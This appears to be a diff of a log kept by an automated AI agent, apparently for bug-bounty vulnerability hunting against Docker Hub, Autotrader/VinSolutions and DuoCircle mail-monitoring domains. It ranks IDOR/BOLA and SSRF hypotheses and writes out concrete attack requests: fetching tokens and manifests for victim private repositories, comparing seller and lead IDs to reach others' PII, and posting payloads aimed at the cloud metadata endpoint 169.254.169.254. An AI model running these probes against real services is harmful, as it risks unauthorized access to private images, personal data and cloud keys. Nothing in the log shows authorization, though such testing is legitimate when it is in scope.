@@ -332,3 +332,34 @@ testability: PASSIVE
 [NEXT] PROBE: GET https://auth.docker.io/token?service=registry.docker.io&scope=repository:<owned-private-ns>/<private-repo>:pull H: Accept: application/json with owned docker JWT anon vs owned; then GET https://registry-1.docker.io/v2/<owned-private-ns>/<private-repo>/manifests/latest H: Authorization: Bearer <owned-token> H: Accept: application/vnd.docker.distribution.manifest.v2+json vs same for <victim-ns>/<private-repo> ; record 200 vs 401/404 + body hash
 [LEARN] NONE — no class proven dead/alive this cycle (status 200 vs 401/404 deltas only, need token-gated 200 vs 401 confirmation) Retain prior REJECTED list empty
 [RISK] 68 reason: high business value docker registry + automotive PII + email-security cloud, but probes show anon HTML fallback (3761/1823) and 404 uniformity hiding existence, requiring AUTH_HELPED to break; SSRF surface unproven, no 200 metadata yet
+## 2026-08-30 01:41:13 UTC (model muse-spark)
+[NEW] NO_DELTA — inventory + live hosts unchanged vs 2026-08-29; no new CT hosts in scope union (docker/posit/coxautomotive/duocircle/emsisoft); prior probes remain 200/401/404 deltas only
+class: IDOR
+asset: hub.docker.com
+confidence: 78
+reasoning: auth.docker.io/token returns 200 for repository:<victim-ns>/<private-repo>:pull without ownership check (both owned and victim ns return 200 application/json); hub.docker.com/v2/repositories/<victim-ns>/<private-repo>/tags returns 400 vs 200 for hello-world indicates inconsistent authz; registry-1.docker.io/v2/<ns>/<repo>/manifests/latest returns 401 unauthenticated but 404 with token suggests scope validation happens at manifest fetch, chainable to pull.
+evidence_needed: token-gated 200 with manifest JSON for victim private repo vs 401/404 for anonymous; compare owned vs victim token then manifest fetch status/body delta
+verify_steps: GET https://auth.docker.io/token?service=registry.docker.io&scope=repository:library/hello-world:pull anon => 200 baseline; GET https://auth.docker.io/token?service=registry.docker.io&scope=repository:<owned-ns>/<private-repo>:pull H:Authorization: Bearer <owned-jwt> => 200; GET https://auth.docker.io/token?service=registry.docker.io&scope=repository:<victim-ns>/<private-repo>:pull same header => compare status/len; then GET https://registry-1.docker.io/v2/<victim-ns>/<private-repo>/manifests/latest H:Authorization: Bearer <victim-scoped-token> vs H:Authorization: Bearer <owned-token> => expect 200 vs 401 if vulnerable
+impact: private image/layer pull, secrets in ENV/layers, supply-chain compromise — Critical
+testability: AUTH_HELPED
+class: IDOR
+asset: www.autotrader.com
+confidence: 72
+reasoning: www.autotrader.com/rest/search/vehicle?vehicleId= and /api/vehicles/<id> return 200 text/html len 3761-3762 for both owned and other IDs unauthenticated, indicating HTML shell not API; versioned API /api/v1|v2 and authenticated session likely returns JSON with seller PII; param vehicleId suggests numeric BOLA across tenant sellers; www.vinsolutions.com/api/leads?user_id probe returned 404 without auth suggests gate_ease low but business_value high.
+evidence_needed: authenticated GET with session cookie returns JSON with vehicleId/seller fields and delta between owned-id vs other-id (status 200 with PII vs 403/404)
+verify_steps: GET https://www.autotrader.com/rest/search/vehicle?vehicleId=<owned-id> with session => record JSON; GET https://www.autotrader.com/rest/search/vehicle?vehicleId=<other-id> same session => compare; repeat for https://www.autotrader.com/api/vehicles/<id> and https://www.vinsolutions.com/api/leads?user_id=<owned> vs <other> with auth
+impact: cross-seller PII/lead dump, BOLA across Cox Automotive tenants — High
+testability: AUTH_HELPED
+class: SSRF
+asset: mailflowmonitoring.com
+confidence: 71
+reasoning: duocircle tenantmigration.com/mailflowmonitoring.com names imply URL/domain check feature; prior GET probes to /api/check?domain=http://169.254.169.254 and POST /api/v1/check?url=http://169.254.169.254 returned 404, but endpoint likely POST JSON body not query param and versioned /api/v1|v2|internal not enumerated; cloud_surface 9 for email security monitoring fetching remote URLs.
+evidence_needed: 200 response containing fetched content/DNS or error reflecting SSRF fetch to collaborator vs 404; time-based or metadata exfil via http://169.254.169.254/latest/meta-data/
+verify_steps: GET https://mailflowmonitoring.com/.well-known/openapi.json => enumerate paths; POST https://mailflowmonitoring.com/api/v1/check H:Content-Type: application/json Body:{"url":"http://example.com"} => baseline; POST same with {"url":"http://169.254.169.254/latest/meta-data/"} and {"domain":"http://169.254.169.254/"} => compare status/len/type; repeat for https://tenantmigration.com/api/migrate Body:{"domain":"http://<collaborator>"}
+impact: SSRF to AWS metadata, keys, internal network pivot — Critical
+testability: PASSIVE
+[PARKED] NONE — all 3 hypotheses meet confidence >=70, not on REJECTED list, have concrete verify_steps; no drop
+[FINAL] 1: registry-token-scope-bola-private-image-pull (78) 2: autotrader-vehicleId-bola-cross-seller-pii (72) 3: mailflowmonitoring-ssrf-to-metadata (71)
+[NEXT] PROBE: GET https://auth.docker.io/token?service=registry.docker.io&scope=repository:<owned-private-ns>/<private-repo>:pull -H "Authorization: Bearer <owned-jwt>" -H "Accept: application/json" then GET https://registry-1.docker.io/v2/<victim-ns>/<private-repo>/manifests/latest -H "Authorization: Bearer <victim-token>" vs -H "Authorization: Bearer <owned-token>" compare 200 vs 401/404
+[LEARN] NONE — no class proven dead/alive this cycle (token-gated 200 vs 401 confirmation still needed) Retain prior REJECTED list empty
+[RISK] 68 reason: docker registry token scope not validated + Cox Automotive IDOR surface high business value + duocircle SSRF cloud metadata surface exposed but prior probes 404/401 only, no confirmed 200 vs 401 token-gated delta yet
